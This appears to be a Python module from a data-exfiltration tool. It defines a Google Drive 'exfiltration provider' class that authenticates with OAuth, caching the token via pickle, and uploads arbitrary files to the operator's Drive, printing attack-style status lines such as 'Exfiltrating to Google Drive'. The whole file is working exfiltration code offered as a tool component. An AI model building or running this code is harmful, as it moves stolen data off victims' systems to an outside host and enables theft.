#!/usr/bin/env python3
"""
Google Drive provider
"""

import os
from pathlib import Path
from .base_provider import BaseCloudProvider

class GoogleDriveProvider(BaseCloudProvider):
    """Google Drive exfiltration provider"""
    
    def __init__(self):
        """Initialize Google Drive provider"""
        super().__init__('Google Drive')
        self.token_file = 'token.pickle'
        self.scopes = ['https://www.googleapis.com/auth/drive.file']
    
    def upload_file(self, filepath, credentials_file, folder_id=None):
        """
        Upload file to Google Drive
        
        Args:
            filepath: Path to file
            credentials_file: Path to OAuth credentials JSON
            folder_id: Optional parent folder ID
            
        Returns:
            Upload result dict or None
        """
        try:
            from google.oauth2.credentials import Credentials
            from google_auth_oauthlib.flow import InstalledAppFlow
            from google.auth.transport.requests import Request
            from googleapiclient.discovery import build
            from googleapiclient.http import MediaFileUpload
            import pickle
            
            print(f"[*] Exfiltrating to Google Drive")
            
            # Get file info
            file_info = self.get_file_info(filepath)
            print(f"[*] File: {file_info['filename']} ({file_info['size_mb']:.2f} MB)")
            
            # Authenticate
            creds = self._authenticate(credentials_file)
            if not creds:
                return None
            
            # Build Drive service
            service = build('drive', 'v3', credentials=creds)
            
            # Create file metadata
            file_metadata = {
                'name': file_info['filename'],
                'mimeType': 'application/octet-stream'
            }
            
            if folder_id:
                file_metadata['parents'] = [folder_id]
            
            media = MediaFileUpload(filepath, resumable=True)
            
            print(f"[*] Uploading...")
            
            # Upload file
            file = service.files().create(
                body=file_metadata,
                media_body=media,
                fields='id, name, webViewLink, size'
            ).execute()
            
            print(f"[+] Upload successful!")
            print(f"[+] File ID: {file.get('id')}")
            print(f"[+] Link: {file.get('webViewLink')}")
            
            return {
                'service': self.service_name,
                'file_id': file.get('id'),
                'filename': file.get('name'),
                'web_link': file.get('webViewLink'),
                'size_bytes': file_info['size']
            }
        
        except ImportError:
            print("[-] Google Drive API not installed")
            print("[!] Install: pip install google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client")
            return None
        except Exception as e:
            print(f"[-] Google Drive error: {e}")
            return None
    
    def _authenticate(self, credentials_file):
        """Authenticate with Google Drive"""
        try:
            from google.oauth2.credentials import Credentials
            from google_auth_oauthlib.flow import InstalledAppFlow
            from google.auth.transport.requests import Request
            import pickle
            
            creds = None
            
            # Load existing credentials
            if os.path.exists(self.token_file):
                with open(self.token_file, 'rb') as token:
                    creds = pickle.load(token)
            
            # Refresh or get new credentials
            if not creds or not creds.valid:
                if creds and creds.expired and creds.refresh_token:
                    print("[*] Refreshing credentials...")
                    creds.refresh(Request())
                else:
                    print("[*] Authenticating...")
                    flow = InstalledAppFlow.from_client_secrets_file(
                        credentials_file, self.scopes)
                    creds = flow.run_local_server(port=0)
                
                # Save credentials
                with open(self.token_file, 'wb') as token:
                    pickle.dump(creds, token)
            
            return creds
        
        except Exception as e:
            print(f"[-] Authentication error: {e}")
            return None
    
    def check_credentials(self, credentials_file):
        """Verify Google Drive credentials"""
        try:
            creds = self._authenticate(credentials_file)
            return creds is not None and creds.valid
        except:
            return False